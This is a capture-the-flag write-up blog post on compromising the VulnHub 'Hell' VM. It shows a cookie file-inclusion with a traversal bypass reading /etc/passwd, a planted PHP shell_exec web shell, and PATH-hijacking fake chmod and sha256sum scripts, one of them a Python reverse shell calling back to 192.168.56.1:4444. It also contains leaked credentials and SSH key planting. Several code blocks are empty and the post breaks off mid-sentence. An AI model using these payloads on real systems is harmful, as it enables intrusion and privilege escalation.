    <content type="html"><![CDATA[<h2>foreword</h2>

<p>Lets start by saying that this is probably one of the toughest boot2root&rsquo;s I have tried thus far. Even though I have managed to get <code>/root/flag.txt</code>, I am yet to actually <em>root</em> this beast. I believe I have arguably come quite far and there is only one hurdle left, however, almost 3 days later I have learnt a <strong>TON</strong> of stuff, and am satisfied to start jotting the experience down. Obviously, should I finally get <strong>root</strong>, I&rsquo;ll update here and reflect. This is also a relatively long post as there were a ton of things to do. Give yourself some time if you plan on reading the whole post :)</p>

<h2>welcome to hell</h2>

<p><a href="http://vulnhub.com/entry/hell-1,95/">Hell</a> is another vulnerable VM hosted at <a href="https://twitter.com/vulnhub">@VulnHub</a>. After recently completing the <a href="https://leonjza.github.io/blog/2014/07/17/climbing-the-skytower/">SkyTower</a> Vulnerable VM, I was feeling up to the challenge of a potentially more challenging VM. And boy, was it challenging&hellip; The wife was away on a <em>girls weekend out</em>, so I had plenty of time to sit and really think about things without distractions.</p>

<h2>the usual first steps</h2>

<p>So, like most other CTF type VM&rsquo;s, the natural first approach is to get the VM up and running, get the network connected and fire off a NMAP port scan to see what we got. I decided to use a Kali Linux VM to attack this vulnerableVM. The IP for the Hell VM was 192.168.56.102:</p>

<p>```bash Hell first portscan
root@kali:~# nmap &mdash;reason 192.168.56.102</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-07-20 19:15 SAST
Nmap scan report for 192.168.56.102
Host is up, received reset (0.00025s latency).
Not shown: 996 filtered ports
Reason: 996 no-responses
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack
80/tcp  open  http    syn-ack
111/tcp open  rpcbind syn-ack
666/tcp open  doom    syn-ack</p>

<p>Nmap done: 1 IP address (1 host up) scanned in 4.38 seconds
```
So tcp/22, tcp/80 (kinda expected that), tcp/111 and then the first <em>whaaat</em> moment, tcp/666.</p>

<h2>poking around</h2>

<p>The tcp/666 was the first unusual thing so I decided to check this out first. A telnet to 192.168.56.102 on port 666 resulted in:</p>

<p>```bash &lsquo;echoserver&rsquo;
root@kali:~# telnet 192.168.56.102 666
Trying 192.168.56.102&hellip;
Connected to 192.168.56.102.
Escape character is &lsquo;^]&rsquo;.</p>

<p>Welcome to the Admin Panel

Starting echo server and monitoring&hellip;
ping
ping
pong
pong
^]quit</p>

<p>telnet> quit
Connection closed.
```</p>

<p>The line <em>&lsquo;Archiving latest version on webserver (echoserver.bak)&hellip;&rsquo;</em> hints towards the fact that we may be able to get this server software via the webserver. Other than that, the session appears to simply echo whatever I input. I toyed around with random inputs but the echoserver did not appear to be too upset about.</p>

<h2>the echo server</h2>

<p>From the banner received with the service running on tcp/666, I browsed to the webserver root and made a request to <code>echoserver.bak</code>:</p>

<p>```bash echoserver
root@kali:~# curl  &ldquo;<a href="http://192.168.56.102/echoserver.bak">http://192.168.56.102/echoserver.bak</a>&rdquo; > echoserver.bak
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</p>

<pre><code>                             Dload  Upload   Total   Spent    Left  Speed
</code></pre>

<p>100  7846  100  7846    0     0  1290k      0 &mdash;:&mdash;:&mdash; &mdash;:&mdash;:&mdash; &mdash;:&mdash;:&mdash; 1532k
root@kali:~# file echoserver.bak
echoserver.bak: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.26, BuildID[sha1]=0xccc6d0e8b14d50e98b07025d5eb9e496a22a8e10, not stripped
```</p>

<p>Now I will admit, this file kept me busy for a very long time. One would try something, google something, try something, goole something, just to get sucked in and lost in a never ending tunnel of binary exploitation &amp; analysis.
To sum up, one would start the echo server up locally, which opens a socket on tcp/666. I&rsquo;d then telnet to 127.0.0.1:666 and fuzz. Running the echoserver with a <code>strace</code>, one will notice the server &lsquo;dying&rsquo; when a socket is closed:</p>

<p><code>bash Echoserver die
bind(3, {sa_family=AF_INET, sin_port=htons(666), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
listen(3, 10)                           = 0
accept(3, 0, NULL)                      = 4
read(4, "test\r\n", 2000)               = 6
write(4, "test\r\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"..., 1500) = 1500
read(4, "", 2000)                       = 0
write(4, "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"..., 1500) = 1500
read(4, "", 2000)                       = 0
write(4, "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"..., 1500) = -1 EPIPE (Broken pipe)
--- SIGPIPE (Broken pipe) @ 0 (0) ---
+++ killed by SIGPIPE +++
</code></p>

<p>Eventually I decided to leave the echoserver alone and move on to the web server.</p>

<h2>the web server</h2>

<p>Web hacking is generally more familiar for me. Initially the web server did not reveal anything interesting. That is until you view the <code>robots.txt</code>:</p>

<p><code>bash Hell robots.txt
root@kali:~# curl http://192.168.56.102/robots.txt
User-agent: *
Disallow: /personal/
Disallow: /super_secret_login_path_muhahaha/
</code></p>

<p>The folder <code>personal/</code> had a g0tmi1lk (founder of VulnHub) fansite detailing that it is being built by Jack and will be live soon. Other than that, nothing particularly interesting. <code>super_secret_login_path_muhahaha</code> however, presented us with a login portal with a title <strong>Admin</strong>.</p>

<p>The login form posted to <code>login.php</code>, and on failure would 302 to: <code>http://192.168.56.102/super_secret_login_path_muhahaha/index.php?the_user_is_a_failure=1</code>. Fuzzing <code>the_user_is_a_failure</code> simply appeared to flip the Login Failed message. Manual and automated test with sqlmap also failed. Sooo, it was time to enumerate some more.</p>

<p>The next move was to fuzz more directories and maybe some interesting files. I decided on <code>wfuzz</code> for this. I used the medium wordlist for the sake of time, and tried for some folders and files in both the known and unknown directories:</p>

<p>```bash Hell web server folders
root@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/big.txt &mdash;hc 404 <a href="http://192.168.56.102/super_secret_login_path_muhahaha/FUZZ">http://192.168.56.102/super_secret_login_path_muhahaha/FUZZ</a></p>

Payload type: file,/usr/share/wordlists/wfuzz/general/big.txt</p>

<h1>Total requests: 3036</h1>

<h1>ID Response   Lines      Word         Chars          Request</h1>

```</p>

<p>Adding <code>.php</code> to the end of my fuzz keyword revealed some more interesting files:</p>

<p>```bash Hell web server files

```</p>

<p>So this gives us slightly more to work with. All of the above are relative to <code>super_secret_login_path_muhahaha</code>.
<code>/1</code> was a big red <strong>INTRUDER ALERT</strong> message, and <code>/server</code> was a gif of a server rack falling over.</p>

<p>From the .php file side of things, it was slightly more interesting.</p>

<h2>302 content anyone?</h2>

<p>I was already aware of <code>index.php</code> as well as <code>login.php</code> due to the root of the login directory revealing this. The rest of the items I browsed using the Iceweasal browser in Kali Linux. The results were:</p>

<ul>
<li><code>mail.php</code> was a page showing us that we have received <em>2</em> emails, and that the &lsquo;firewall&rsquo; is activated. There was also what I think is a spam filtering dog gif ;)</li>
<li><code>panel.php</code> simply redirected you back to <code>index.php</code>. Assuming there is a auth requirement here.</li>
<li><code>personal.php</code> also simply redirected you back to <code>index.php</code>. Again, assuming a auth requirement.</li>
<li><code>server.php</code> had the gif we saw in <code>/server</code> with some humorous test with it. Nothing really of interest.</li>
<li><code>users.php</code> just returned the words <em>Jack</em>. This is the same user mentioned in the shrine page from <code>/personal/</code>.</li>
</ul>


<p>Due to these auth requirements, I decided to take all of these url&rsquo;s to <code>curl</code>, and inspect the cookies, headers etc. that were being sent around. Maybe this will hint towards something useful. The command used for the investigations was:</p>

<p>```bash Hell curl
root@kali:~# curl -L -v <a href="http://192.168.56.102/super_secret_login_path_muhahaha/index.php">http://192.168.56.102/super_secret_login_path_muhahaha/index.php</a> -c cookies -b cookies
<HTML>
<FORM name="login" method="post" action="login.php"></p>

<p><CENTER>
<H1> Admin </H1>
<H3>
<STRONG>Username:</STRONG>
<INPUT name="username" id="username" type="text" value=""/>
<BR>
<BR>
<STRONG>Password:</STRONG>
<INPUT name="password" id="password" type="password" value=""/>
<BR>
<BR>
<INPUT name="mysubmit" id="mysubmit" type="submit" value="Login"/>
</H3>
</HTML>
```</p>

<p>Here I am telling curl to make a <code>GET</code> request to <a href="http://192.168.56.102/super_secret_login_path_muhahaha/index.php,">http://192.168.56.102/super_secret_login_path_muhahaha/index.php,</a> using a cookies file called <code>cookies</code> when making the request (-b flag), and storing any cookies received in the same file (-c flag). I am also telling it to follow redirects in the case of <code>302</code>&rsquo;s, and be verbose with output so that I can see the headers. Requesting <code>index.php</code> resulted in a cookie jar of:</p>

<p>```bash Hell cookie-jar
root@kali:~# cat cookies</p>

<h1>Netscape HTTP Cookie File</h1>

<h1><a href="http://curl.haxx.se/rfc/cookie_spec.html">http://curl.haxx.se/rfc/cookie_spec.html</a></h1>

<h1>This file was generated by libcurl! Edit at your own risk.</h1>

<p>192.168.56.102 FALSE /  FALSE 0  PHPSESSID   8u300rbb0747fi6iocm0lt4310
```</p>

<p>Great. So I used this on all of the enumerated scripts, carefully checking for anything that would stand out. This part definitely took me some time to realize, but I finally saw the gem when I made a request to <code>personal.php</code>:</p>

<p>```bash 302 output

<p>Look at line 25. <em>Ignoring the request-body</em>. But we got a 302? Ok lets make another request without the <code>-L</code> flag and check if it reveals anything:</p>

<p>Well what do you know. We get a 302 and content. This time we have a login form that posts to <code>check.php</code>. A <code>GET</code> request to <code>check.php</code> resulted in a 302, but to <code>personal.php</code> and not <code>index.php</code>.</p>

<p><code>panel.php</code> had similar behavior. Showing content even though we got a 302. The output for <code>panel.php</code>:</p>

<p><code>html
&lt;HTML&gt;
&lt;CENTRE&gt;
&lt;H2&gt; Folders &lt;/H2&gt;
&lt;TABLE style="width:700px" align="center"&gt;
&lt;TR&gt;
   &lt;TD&gt;&lt;A HREF="server.php"&gt;&lt;IMG SRC='folder.png'&gt;&lt;/A&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;A HREF="mail.php"&gt;&lt;IMG SRC='folder.png'&gt;&lt;/A&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;A HREF="users.php"&gt;&lt;IMG SRC='folder.png'&gt;&lt;/A&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;A HREF="personal.php"&gt;&lt;IMG SRC='folder.png'&gt;&lt;/A&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;A HREF="notes.php"&gt;&lt;IMG SRC='folder.png'&gt;&lt;/A&gt;&lt;/TD&gt;
&lt;/TR&gt;
&lt;TR&gt;
   &lt;TD&gt;&lt;H4&gt;Server Status&lt;/H4&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;H4&gt;Mail Status&lt;/H4&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;H4&gt;Auth Users&lt;/H4&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;H4&gt;Personal Folder&lt;/H4&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;H4&gt;Notes&lt;/H4&gt;&lt;/TD&gt;
&lt;/TR&gt;
&lt;/CENTRE&gt;
&lt;/HTML&gt;
</code></p>

<p>Here we have another script, <code>notes.php</code> revealed. Browsing to <code>notes.php</code>, we are presented with a input field with a <em>Write Note</em> button, and a message stating: <em>&ldquo;note.txt stored to temporary storage upon submission&rdquo;</em>. I guessed this temporary storage is most probably /tmp. Posting to notes.php did not yield any input and I figured this was part of something to come later.</p>

<h2>finding the web vuln</h2>

<p>Ok we have come this far and you still reading? :O Just a little more and all will be revealed I promise.</p>

<p>Back to <code>check.php</code>, it was time to check for any potential SQL injection on the post to <code>check.php</code> from the login form. Nope. Nothing like that. However, while messing around I noticed that this script was setting a new cookie <code>failcount</code>. failcount would increment with every incorrect login to <code>check.php</code>. After <em>3</em> failed attempts, another cookie called <code>intruder</code> was set:</p>

<p>```bash Hell failcount
Added cookie intruder=&ldquo;1&rdquo; for domain 192.168.56.102, path /super_secret_login_path_muhahaha/, expire 0</p>

<blockquote><p>Cookie: intruder=1; failcount=4; PHPSESSID=8u300rbb0747fi6iocm0lt4310
```</p></blockquote>

<p>Again I will admit this did not jump right out at me. In fact it took quite a few more requests to finally puzzle it together. However, I finally nailed it when a request without the -L (follow redirects) flag was set for <code>panel.php</code>:</p>

<p><code>bash Hell Intruder
&lt;HTML&gt;
&lt;CENTRE&gt;
&lt;H2&gt; Folders &lt;/H2&gt;
&lt;TABLE style="width:700px" align="center"&gt;
&lt;TR&gt;
   &lt;TD&gt;&lt;A HREF="server.php"&gt;&lt;IMG SRC='folder.png'&gt;&lt;/A&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;A HREF="mail.php"&gt;&lt;IMG SRC='folder.png'&gt;&lt;/A&gt;&lt;/TD&gt;

&lt;/FONT&gt;
&lt;/CENTER&gt;
&lt;/HTML&gt;
&lt;/HTML&gt;
</code></p>

<p>Notice the familiar <strong>INTRUDER ALERT</strong> message? :) Also remember how this file was called <code>/1</code> from the previous enumeration? Yep! File Include time! With us having a cookiejar file called <code>cookies</code> available for editing, it was easy to play around with this. The normal cookiejar had:</p>

<p>```bash Hell cookiejar
root@kali:~# cat cookies</p>

<h1>Netscape HTTP Cookie File</h1>

<h1><a href="http://curl.haxx.se/rfc/cookie_spec.html">http://curl.haxx.se/rfc/cookie_spec.html</a></h1>

<h1>This file was generated by libcurl! Edit at your own risk.</h1>

<p>192.168.56.102 FALSE /  FALSE 0  PHPSESSID   8u300rbb0747fi6iocm0lt4310

192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE 0  intruder 1
```</p>

<p>To test the file include, the first knee jerk reaction was to replace the <code>1</code> with <code>/etc/passwd</code>. This yielded no results, and immediately I feared failure and assumptions disappointing me. However, just to make sure, I replaced it again with something in the same path as <code>/1</code>, like <code>mail.php</code>:</p>

<p>```bash Hell file include testing

<p>YES. It <strong>does</strong> work! We have the same output added to the <code>panel.php</code> output as we would have if we browsed directly to <code>mail.php</code>. By now the assumption was that the code had something like:</p>

<p><code>php Hell File Include assumption
if ($_COOKIE['intruder']) {
   include($_COOKIE['intruder']);
}
</code></p>

<p>&hellip;with some kind of filtering preventing reading the <code>/etc/passwd</code>. While I was still pretty excited about finding this vuln, I soon came across <a href="https://www.owasp.org/index.php/Testing_for_Path_Traversal_(OWASP-AZ-001">this</a>#Gray_Box_testing_and_example) article detailing potential ways of bypassing directory traversal vulnerabilities. After reading this I promptly changed the <code>intruder</code> cookie to <code>....//....//....//....//....//etc/passwd</code> and viola! :)</p>

<p>```bash Hell Directory Traversal

<p>YEAH. That felt pretty darm good! Obviously not knowing all the steps needed to complete this VM, I figured I had come a pretty long way to finding the pot of gold. (Note the users in this file for later) During the enumeration I took a chance to include <code>/root/flag.txt</code>:</p>

<p><code>``bash Hell /root/flag.txt</code>

Congratulations of beating Hell.</p>

<p>I hope you enjoyed it and there weren&rsquo;t to many trolls in here for you.</p>

<p>Hit me up on irc.freenode.net in #vulnhub with your thoughts (Peleus) or follow me on twitter @0x42424242</p>

<p>Flag: a95fc0742092c50579afae5965a9787c54f1c641663def1697f394350d03e5a53420635c54fffc47476980343ab99951018fa6f71f030b9986c8ecbfc3a3d5de</p>

<p>And bingo. <em>Technically</em> we finished what the original goal was, though, re-reading the original entry on Vulnhub, I was almost certain this was not the only way to get to this. Maybe a bug on the original release of the VM? I don&rsquo;t know.
From here on onwards, the goal was no longer to read <code>/root/flag.txt</code>. No, we now have to root this VM :)</p>

<h2>gaining shell</h2>

<p>With the focus slightly shifting, and our ability to read files off the file system, the next natural step was to attempt to get command execution on the VM. Remembering the <code>notes.php</code> file, I decided to try include <code>/tmp/note.txt</code>. This worked just fine and echoed my testing attempts from earlier. So with this information, I simply went back to <code>notes.php</code>, entered: <code>&lt;?php print_r(shell_exec($_GET['c'])); ?&gt;</code>, and submitted the form. Next I edited the cookiejar to include <code>/tmp/notes.txt</code>, and proceeded to test my command execution:</p>

<p><code>bash Hell command execution
root@kali:~# curl http://192.168.56.102/super_secret_login_path_muhahaha/panel.php?c=id -c cookies -b cookies
[snip]
&lt;/CENTRE&gt;
uid=33(www-data) gid=33(www-data) groups=33(www-data)
&lt;/HTML&gt;
root@kali:~#
</code></p>

<p>Yay :) With this confirmed working, I modified the command exec request slightly so that commands with potentially strange characters are correctly encoded etc:</p>

<p><code>bash Hell 'better' command execution
curl http://192.168.56.102/super_secret_login_path_muhahaha/panel.php?c=$(echo -n “ls -lah” | python -c "import urllib, sys; print urllib.quote(''.join(sys.stdin));") -c cookies -b cookies
</code></p>

<h2>becoming jack</h2>

<p>With command execution, it was easy to start enumerating as much as possible about the VM. At least as much as the <code>www-data</code> user has access to, which is generally quite a lot.</p>

<p>I looked at the source files for the website out of curiosity about the filtering etc that was going on. I stumbled upon some MySQL credentials in <code>login.php</code>:</p>

<p><code>php MySQL credentials
// mysql_connect("127.0.0.1", "Jack", "zgcR6mU6pX") or die ("Server Error"); I'll change this back once development is done. Got sick of typing my password.
mysql_connect("127.0.0.1", "www-data", "website") or die("Server Error");
</code></p>

<p>The comment was quite helpful along with all the mentions of Jack on the website, along with the <code>/etc/passwd</code> revealing a <code>jack</code> user, I tried these credentials on a SSH session:</p>

<p>```bash ssh as jack

<p>Well that was easy&hellip; With this shell, I also checked out the MySQL database to see if there is any interesting information:</p>

<p>Alrighty. I made a note about the credentials we have associated with &lsquo;Jack&rsquo; so far. I also tested these credentials on the website, just to get a feel of what the site was actually supposed to do :P</p>

<p>With all this information now known to us, and the fact that I know PGP is pretty popular to encrypt files and sign mail, I figured we had to get this key loaded and decrypt something using it. Further enumeration revealed that <code>/var/mail</code> was world readable:</p>

<p>I loaded the private GPG key into jacks keyring with:</p>

<p><code>bash Loading Jacks private key

<p>Ofc this doesn’t mean I can actually use it yet, however there was a note about the password, so I could possibly just try all the ones I have found so far for jack. Decrypting the encrypted message we found for jack was as simple as:</p>

<p>```bash Decryting Jacks mail

<p>Easy :D</p>

<h2>becoming george</h2>

<p>The user <code>milk_4_life</code> has a <code>game</code> in hes home folder.</p>

<p>```bash milk_4_life game
$ ls -lah game
&mdash;-s&mdash;x&mdash;x 1 george george 5.7K Jun 19 18:24 game</p>

<p>$ ./game
I&rsquo;m listening
```</p>

<p>Not a very interesting game thus far. I decided to quit and rerun the game, this time backgrounding it with <code>&amp;</code>. At this stage I wanted to run a netstat to see if it is <em>listening</em> on a port or something, but the netstat command was not available. I figured I could cause a error as the same port can not be opened twice. So, with <code>./game &amp;</code> already running, another instance of <code>./game</code> errored out, revealing the listening port:</p>

<p>```bash Game TCP port
$ ./game &amp;
I&rsquo;m listening</p>

<p>$ ./game
Traceback (most recent call last):
  File &ldquo;/usr/bin/game.py&rdquo;, line 58, in <module></p>

<pre><code>tcpSocket.bind(("0.0.0.0", 1337))
</code></pre>

<p>  File &ldquo;/usr/lib/python2.7/socket.py&rdquo;, line 224, in meth</p>

<pre><code>return getattr(self._sock,name)(*args)
</code></pre>

<p>socket.error: [Errno 98] Address already in use
Lol nope
$
```</p>

<p>tcp/1337 it is. Lets telnet to this:</p>

<p>```bash Game Interface
milk_4_life@hell:~$ telnet 127.0.0.1 1337
Trying 127.0.0.1&hellip;
Connected to 127.0.0.1.
Escape character is &lsquo;^]&rsquo;.
Type &lsquo;START&rsquo; to begin</p>

<p>START
Starting&hellip;</p>

<p>You have 30 seconds to get as many points as you can, beat the high score! (High Score: 133723)</p>

<p>Quick what&rsquo;s&hellip; 397 x 358? 1
Quick what&rsquo;s&hellip; 498 x 111? 2
Quick what&rsquo;s&hellip; 740 x 772?
Final Score: 0</p>

<p>Connection closed by foreign host.
milk_4_life@hell:~$
```</p>

<p>Typing anything other than <code>START</code> would simply cause the script to die. Typing a non integer as a answer causes a loop, and that is about it.
Sooo, time to win this game and see what would happen. I decided to attempt this with a python script. The general idea would be to read the socket output, calculate the answer and send that back. This resulted in a script as follows (yeah I know its not perfect but gets the job done):</p>

<p>```python play_game.py</p>

<h1>!/usr/bin/python</h1>

<p>import socket, sys</p>

<h1>start a socket</h1>

<p>sock = socket.socket()</p>

<h1>connect locally</h1>

<p>sock.connect((&lsquo;127.0.0.1&rsquo;, 1337))
ret = sock.recv(1024)   # read 1024 bytes
print &lsquo;[I] %s&rsquo; % ret.strip()</p>

<h1>start the game</h1>

<p>print &lsquo;[O] START&rsquo;
sock.send(&lsquo;START\n&rsquo;) # START the game
ret = sock.recv(1024)   # read 1024 bytes
print &lsquo;[I] %s&rsquo; % ret.strip()</p>

<h1>Start reading the socket input and calculating answers sending them back</h1>

<p>while True:
   ret = sock.recv(1024)
   print &lsquo;[I] %s&rsquo; % ret.strip()</p>

<p>   # split by spaces
   ret = ret.split(&lsquo; &rsquo;)</p>

<p>   # a question line
   if ret[0] == &lsquo;Quick&rsquo;:</p>

<pre><code>  # extract the 2 integers from:
  # ['Quick', "what's...", '435', 'x', '574?', '']
  one = int(ret[2])
  two = int(ret[4].replace('?',''))   # remove the comma
  answer = one * two
  print '[O] Answer %s' % answer
  sock.send(str(answer) + '\n')
</code></pre>

<p>   # once the 30 seconds passes, a line with Final will return. This
   # is the end of the game
   elif ret[0] == &lsquo;Final&rsquo;:</p>

<pre><code>  print 'Done?'
  sock.close()
  sys.exit(0)
</code></pre>

<p>   # if we dont know what to do, just &lsquo;press enter&rsquo;
   else:</p>

<pre><code>  sock.send('\n')
</code></pre>

<p>sock.close()
```</p>

<p>I ran this in another session with <code>./game</code> running and won :P Once you win, the output results in:</p>

<p>```bash Game Win Output
!<em>!</em>!<em>!</em>! Congratulations, new high score (302785) !<em>!</em>!<em>!</em>!</p>

<p>I hear the faint sound of chmodding&hellip;&hellip;.
```</p>

<p>&hellip; and ends. Heh, ok. Well that was probably not exactly what I hoped for, but nonetheless, the chmodding is at least a hint. The first thing that came to mind is a important file that was previously not available now possibly is as its been chmodded by <code>george</code> after winning the game. Or, if it is in fact a chmod that is being run, is it being called via a system command from its full path (/usr/bin/chmod), or just via chmod?</p>

<p>To test, I fired up another editor on <code>chmod.py</code> and just put a line to echo test. I <code>chmod +x</code> this and moved the file to <code>/tmp</code>. I then added <code>/tmp</code> to <code>PATH</code> via <code>export PATH=/tmp:$PATH</code>:</p>

<p><code>bash Testing chmod path resolve
milk_4_life@hell:~$ python chmod.py          # test the script
Testing chmod exec
milk_4_life@hell:~$ cp chmod.py /tmp/chmod   # copy it to /tmp
milk_4_life@hell:~$ chmod +x /tmp/chmod      # make it executable
milk_4_life@hell:~$ /tmp/chmod               # test it
Testing chmod exec
milk_4_life@hell:~$ export PATH=/tmp:$PATH   # prefix PATH with /tmp
milk_4_life@hell:~$ chmod                    # test it without full path
Testing chmod exec
milk_4_life@hell:~$ ./game                   # start the game
I'm listening
Testing chmod exec                           # profit :)
</code></p>

<p>With it confirmed that <code>chmod</code> was not called from its full path once you win the game (using our previously mentioned winning script :D), it was time to edit our <code>chmod</code> script to be slightly more useful:</p>

<p>```python Evil chmod</p>

<h1>!/usr/bin/python</h1>

<p>import pty
pty.spawn(&lsquo;/bin/sh&rsquo;)
```</p>

<p>With this now in /tmp/chmod, I reran <code>./game.py</code>, and then <code>./play_game.py</code>. After 30 seconds on the session we started the game we had:</p>

<p><code>bash George's permissions
milk_4_life@hell:~$ ./game
I'm listening
$ id
uid=1002(milk_4_life) gid=1002(milk_4_life) euid=1000(george) groups=1000(george),1002(milk_4_life)
$
</code></p>

<p>Profit! We now have access to <code>george</code>&rsquo;s home directory :) In order to make the next steps easier, I quickly generated a new ssh key pair using <code>ssh-keygen</code>, and added the contents of the resultant <code>id_rsa.pub</code> to <code>.ssh/authorized_keys</code>. Whats important to note in the below snippet is that the full path of <code>chmod</code> is used. If we don’t, we will be hitting the chmod we just fooled to get to this shell in the first place :D</p>

<p><code>bash Adding ssh key to George's authorized_keys
$ id
uid=1002(milk_4_life) gid=1002(milk_4_life) euid=1000(george) groups=1000(george),1002(milk_4_life)
$ cd /home/george
$ mkdir .ssh
$ /bin/chmod 755 .ssh
$ cd .ssh
$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3KB7V05tHJAWFavTgTK1dDIcUUVyUpZA3TYQhydNjeexWDeVzPNUGCo3/XZNgqw0QpaoX5eLm9k9OqxNyr7x5B6Rq2F7ykA0DHglbM4DLJDQRawHgoCzTwxBWAMva3HUbahounJFe9fOaECGZEsCmTF1462wTuZ/SYOO9lSHv38cO8b9nC5lteBz2An34+W/n9X1sxBAlDAHyXmAqJYpoE+gur+YX8j3WPNJbiBu3nVnvpDaR1BnvN1n74/yUtLYziT5Gt7lgRWiaDhzslR+46xbu/YmCyO03ztHhD/lD2JAcoEe43FKFUdh8ZGfBqCq0CbBB86KHhhLzV6QjLHjV root@kali" &gt; authorized_keys

</code></p>

<p>Now we can SSH into the VM as <code>george</code></p>

<h2>becoming bazza</h2>

<p>George&rsquo;s home directory had what looked like a TrueCrypt container <code>4.0M Jun 19 21:09 container.tc</code> in hes home directory. TrueCrypt appeared to be installed on the VM, and attempting to mount the container failed due to an invalid keyfile and or password.</p>

<p><code>george</code> also had mail in <code>/var/mail</code>:</p>

<p>There is a mention of <em>rockyou</em> in the From address. There is a famous rockyou wordlist used for password cracking out in the wild. With that in mind, and the fact that it was 0430 already, I decided to copy the <code>container.tc</code> to my Kali Linux install, and have <code>truecrack</code> have a go at it while I catch up on some much deserved sleep.</p>

<h3>fast forward a few hours</h3>

<p>A few hours passed, with 0 luck on cracking the password for the container. I started to realize that this <em>may</em> not be the correct path in getting the container open, assuming that is the next step. However, as a last resort, I opted to copy the files onto my Windows gaming PC and run it via a GPU cracker, <a href="http://hashcat.net/oclhashcat/">oclHashcat</a>.</p>

<p>```bash Windows ocl hashcat

<p>About 19 seconds later, we have the password thanks to hashcat!</p>

<p>So, lets mount the container and see whats inside:</p>

<h2>becoming oj</h2>

<p><code>bazza</code> had 2 interesting files in hes home directory:</p>

<p><code>bash Bazza Home
bazza@hell:~$ ls -lh
total 20K
-rw-r--r-- 1 root root        109 Jul  6 18:32 barrebas.txt
-r-xr-sr-x 1 oj   developers 6.1K Jul  6 18:39 part1
-r-sr-xr-x 1 oj   oj         5.2K Jul  6 18:34 part2
</code></p>

<p>The <code>barrebas.txt</code> looks to be a shoutout to the tester of the vulns. <code>part1</code> &amp; <code>part2</code> from first glance had interesting permissions, and made it relatively easy to determine that the next user we should be after this is <code>oj</code>. Running <code>part1</code> and <code>part2</code>:</p>

<p>```bash bazza puzzle
bazza@hell:~$ ./part1
Checking integrity of part2&hellip; Done!!</p>

<p>Checking integrity of calling target&hellip; Done!!</p>

<p>Binary and target confirmed.</p>

<p>Can&rsquo;t touch this <em>nah na na na na naaaaaaaa nah</em>
uid=1004(bazza) gid=1004(bazza) euid=1005(oj) egid=1003(developers) groups=1005(oj),1004(bazza)</p>

<p>bazza@hell:~$ ./part2</p>

<p>Error! 1004 ID detected &hellip; youre not allowed to run this, please use part 1!
bazza@hell:~$
```</p>

<p>So it seems that part2 is protected apparently due to the fact that our uid (or groupid?) of 1004 was not allowed. Slightly cryptic, but a few thoughts about what the binaries are doing were already going about. <code>part1</code> outputs what looks like the output of the <code>id</code> command too.</p>

<p>Again, this part took some time and resulted in a rabbit-hole scenario of try something, google something, try something, google something. I am not going to go through everything I have tried for this part, but simply try depict how I managed to figure this out in the end.</p>

<p>We start with a <code>strings</code> of <code>part1</code>:</p>

<p><code>bash part1 strings
bazza@hell:~$ strings part1

;*2$"
</code></p>

<p>This should give you a pretty good idea of what is potentially going on in the binary, like:</p>

<ul>
<li> Check the sha256sum of /gome/bazza/part matches 900462fbf9593f1a4b753f1729c431abc80932a151e9b293e13822a91f9641c1</li>
<li> Check the sha256sum of /usr/bin/id matches 1003a011c5bdb65a07a8f92feb6b7d7ecbf3a3ff0f2a46abbe5c777c525996d8</li>
<li> Eventually Fail if these don’t match.</li>
</ul>


<p>The key lies in the fact that the <code>sha256sum</code> command does not appear to be called from its full path location ie: /usr/bin/sha256sum. So, similar to how we fooled the <code>chmod</code> earlier, we are going to do exactly the same with the <code>sha256sum</code>.</p>

<p>As before, we create a <em>evil sha256sum</em> command, which is actually just a python script to spawn <code>/bin/sh</code>, then prefix <code>PATH</code> with <code>/tmp</code> and run <code>./part1</code>. For this one however, I was having trouble with the pty.spawn() and didn&rsquo;t really feel like troubleshooting that much. So I opted for a (reverse shell)[<a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a>] payload instead to open on a netcat listener that I have on my host laptop:</p>

<p>```python Reverse Shell</p>

<h1>!/usr/bin/python</h1>

<p>import socket,subprocess,os</p>

<p>s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((&ldquo;192.168.56.1&rdquo;,4444))</p>

<p>os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)</p>

<p>p = subprocess.call([&ldquo;/bin/sh&rdquo;,&ldquo;-i&rdquo;])
```</p>

<p>I spawned a <code>netcat</code> listener on my laptop using <code>nc -l 4444</code>, and ran <code>./part1</code>:</p>

<p><code>bash Answered netcat
→ nc -l 4444
$ id
uid=1004(bazza) gid=1004(bazza) egid=1003(developers) groups=1004(bazza)
</code></p>

<p>Notice that I was now in the <code>developers</code> group. I was now allowed to run <code>./part2</code> too&hellip; with a verbose line showing me the permissions I would need to gain access to <code>/home/oj</code>:</p>

<p>```bash bazza Part2 test
$ ./part2
uid=1004(bazza) gid=1004(bazza) euid=1005(oj) egid=1003(developers) groups=1005(oj),1004(bazza)</p>

<p>Can&rsquo;t touch this <em>nah na na na na naaaaaaaa nah</em>
$
<code>``
And, as expected, I spent some time on this binary too. I didn't expect</code>part2<code>to be any easier :P
